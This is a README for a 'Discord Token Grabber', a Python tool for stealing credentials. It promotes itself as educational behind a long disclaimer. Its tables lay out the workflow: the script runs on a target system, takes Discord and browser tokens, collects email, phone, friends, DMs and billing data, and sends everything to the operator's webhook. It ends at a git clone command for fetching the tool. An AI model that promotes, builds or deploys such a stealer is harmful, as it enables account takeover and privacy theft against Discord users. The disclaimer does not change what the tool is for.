# 🔐 Discord Token Grabber

**A powerful, open-source tool for educational and research purposes that demonstrates how Discord authentication tokens are stored locally and can be extracted to highlight security vulnerabilities.**

![Version](https://img.shields.io/badge/version-3.0-blue)
![Python](https://img.shields.io/badge/python-3.8+-green)
![License](https://img.shields.io/badge/license-MIT-red)
![Status](https://img.shields.io/badge/status-stable-brightgreen)

---

## ⚠️ DISCLAIMER - READ THIS FIRST

> **🚨 IMPORTANT: This tool is provided SOLELY FOR EDUCATIONAL AND RESEARCH PURPOSES.**
>
> **⛔ YOU ARE NOT ALLOWED TO:**
> - ❌ Use this tool for malicious purposes
> - ❌ Use this tool without explicit consent from all parties involved
> - ❌ Violate Discord's Terms of Service
> - ❌ Share, sell, or distribute collected tokens
> - ❌ Target individuals without their knowledge
> - ❌ Use this for account theft, harassment, or any illegal activity
>
> **✅ YOU ARE ALLOWED TO:**
> - ✔️ Use this in controlled, consensual environments
> - ✔️ Educate others about privacy and security risks
> - ✔️ Test your own systems and networks
> - ✔️ Report security vulnerabilities responsibly
> - ✔️ Learn how Discord stores authentication data
> - ✔️ Understand how token-based authentication works
>
> **👨‍⚖️ The author is NOT responsible for any misuse or damage caused by this tool.**
>
> *By downloading, installing, or using this tool, you agree to take FULL responsibility for your actions.*

---

## 📖 What is This?

**Discord Token Grabber** is a Python-based tool that demonstrates how Discord authentication tokens are stored locally on a user's system and how they can be extracted.

### 🔍 How It Works

| # | Step | Description |
|---|------|-------------|
| 1️⃣ | **Run the script** | Execute on target system |
| 2️⃣ | **Scan storage** | Searches Discord leveldb directories |
| 3️⃣ | **Extract tokens** | Parses log files for token patterns |
| 4️⃣ | **Validate tokens** | Checks if tokens are still active |
| 5️⃣ | **Fetch user data** | Gets profile info from Discord API |
| 6️⃣ | **Collect metadata** | Friends, servers, DMs, billing info |
| 7️⃣ | **Send to webhook** | Data delivered to your Discord channel |

### 🎯 Why This Matters

Discord stores authentication tokens in plain text within leveldb files on the user's computer. Any application or script with read access to these directories can extract these tokens. Once a token is obtained, an attacker can fully impersonate the user, access their messages, join their servers, and perform actions as if they were the user. This is not a Discord-specific issue - it's how token-based authentication works. The purpose of this tool is to educate people about these security risks and the importance of protecting local files.

---

## ⚡ Features

| 🏷️ Feature | 📝 Description |
|------------|----------------|
| 🔑 **Token Extraction** | Captures authentication tokens from Discord storage |
| 🖥️ **Multi-Platform** | Supports Windows, Linux, and macOS |
| 🗂️ **Multiple Sources** | Scans Discord, Canary, PTB, and Development versions |
| 🌐 **Browser Support** | Extracts tokens from Chrome, Brave, and Edge |
| ⚡ **Concurrent Scanning** | Uses multi-threading for fast file processing |
| 🔍 **Token Validation** | Verifies tokens with Discord API v10 |
| 👤 **User Information** | Gets username, discriminator, email, phone |
| 💎 **Nitro Detection** | Checks if user has Discord Nitro |
| 👥 **Friends List** | Retrieves user's friends and relationships |
| 🏰 **Server List** | Gets all guilds user is a member of |
| 💬 **DM Channels** | Fetches recent direct message conversations |
| 🔗 **Connected Accounts** | Gets linked external accounts (Spotify, Steam, etc.) |
| 💳 **Billing Info** | Checks for active subscriptions |
| 📨 **Discord Webhook** | All data sent directly to your Discord channel |
| 💾 **JSON Export** | Saves all data locally for analysis |
| 🛡️ **Rate Limit Handling** | Prevents API rate limiting issues |

---

## 🔧 Installation

### 📋 What You Need Before Starting

| ✅ Item | ℹ️ Description |
|---------|----------------|
| 🐍 Python 3.8+ | Installed on your computer |
| 🎮 Discord Account | A server/channel you control |
| 🔗 Discord Webhook URL | Created from your Discord server settings |
| 🖥️ Command Line | Basic knowledge of terminal/command prompt |

### 📥 Step 1: Get the Code

Open your terminal/command prompt and run:

```bash
git clone https://github.com/timzz71/discord-token-grabber.git
cd discord-token-grabber
